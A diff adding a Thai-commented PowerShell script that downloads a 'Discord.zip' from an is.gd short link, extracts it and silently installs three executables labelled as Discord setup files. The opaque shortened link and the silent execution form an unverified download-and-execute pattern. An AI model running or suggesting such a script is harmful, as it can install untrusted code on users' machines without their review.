@@ -1,0 +1,42 @@
+# ตั้งค่าตัวแปร
+$targetDir = "C:\phwyverysad"
+$zipPath = "$targetDir\Discord.zip"
+$filesToInstall = @("DiscordSetup.exe", "DiscordPTBSetup.exe", "DiscordCanarySetup.exe")
+
+# 1. สร้างโฟลเดอร์
+if (-not (Test-Path $targetDir)) { New-Item -Path $targetDir -ItemType Directory | Out-Null }
+
+# 2. ดาวน์โหลดแบบประสิทธิภาพสูง
+Write-Host "กำลังดาวน์โหลด Discord.zip..." -ForegroundColor Cyan
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://is.gd/ZXkT4s", $zipPath)
+
+# 3. แตกไฟล์
+Write-Host "กำลังแตกไฟล์..." -ForegroundColor Cyan
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $targetDir)
+
+# 4. ย้ายไฟล์ออกมาที่ C:\phwyverysad (ถ้าไฟล์อยู่ในโฟลเดอร์ย่อยชื่อ Discord)
+$sourceDir = "$targetDir\Discord" # ปรับชื่อโฟลเดอร์ให้ตรงกับโครงสร้างใน zip ของคุณ
+foreach ($file in $filesToInstall) {
+    if (Test-Path "$sourceDir\$file") {
+        Move-Item -Path "$sourceDir\$file" -Destination $targetDir -Force
+    }
+}
+
+# 5. ลบไฟล์ที่ไม่ได้ใช้
+Remove-Item -Path $zipPath -Force
+if (Test-Path $sourceDir) { Remove-Item -Path $sourceDir -Recurse -Force }
+
+# 6. ติดตั้งทีละตัวแบบเงียบ
+foreach ($exe in $filesToInstall) {
+    $exePath = "$targetDir\$exe"
+    if (Test-Path $exePath) {
+        Write-Host "กำลังติดตั้ง $exe..." -ForegroundColor Yellow
+        # /S คือสวิตช์สำหรับติดตั้งแบบเงียบของ Discord
+        $process = Start-Process -FilePath $exePath -ArgumentList "/S" -Wait -PassThru
+        Write-Host "ติดตั้ง $exe เสร็จสิ้น" -ForegroundColor Green
+    }
+}
+
+Write-Host "การดำเนินการทั้งหมดเสร็จสมบูรณ์" -ForegroundColor Cyan
